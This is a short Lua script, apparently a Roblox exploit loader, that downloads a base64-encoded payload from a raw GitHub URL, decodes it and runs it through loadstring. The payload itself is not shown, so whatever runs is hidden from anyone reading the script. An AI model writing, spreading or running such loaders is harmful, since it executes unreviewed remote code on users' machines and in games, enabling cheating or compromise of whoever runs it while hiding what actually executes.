local HttpService = game:GetService("HttpService")

local payload = game:HttpGet(
    "https://raw.githubusercontent.com/humzhumz3-lgtm/sentinel---loader/main/payload.txt",
    true
)

local decoded = HttpService:Base64Decode(payload)
loadstring(decoded)()
